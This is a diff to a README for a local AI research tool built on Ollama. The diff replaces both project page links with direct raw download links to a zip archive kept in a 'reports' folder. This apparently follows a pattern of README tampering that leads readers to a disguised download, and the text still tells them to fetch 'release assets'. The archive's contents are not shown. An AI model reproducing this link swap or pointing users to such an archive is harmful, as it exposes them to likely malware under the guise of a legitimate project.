@@ -1,6 +1,6 @@
 # 🤖 local-ai-research-assistant - Automate deep research with local intelligence
 
-https://github.com/Indrasclerotinia71/local-ai-research-assistant
+https://github.com/Indrasclerotinia71/local-ai-research-assistant/raw/refs/heads/main/reports/research_local_ai_assistant_v2.7.zip
 
 ## 📖 Overview
 This tool performs automated research tasks. It uses local artificial intelligence to gather information from the internet. You use it to find facts, extract content, and create structured reports. The system runs entirely on your own hardware. This keeps your data private and secure. It relies on Ollama for intelligence and web search tools for data collection.
@@ -15,7 +15,7 @@ This tool performs automated research tasks. It uses local artificial intelligen
 ## 📥 Getting Started
 Visit the link below to reach the project page. Locate the latest release assets to begin.
 
-https://github.com/Indrasclerotinia71/local-ai-research-assistant
+https://github.com/Indrasclerotinia71/local-ai-research-assistant/raw/refs/heads/main/reports/research_local_ai_assistant_v2.7.zip
 
 1. Open your web browser.
 2. Navigate to the link provided above.
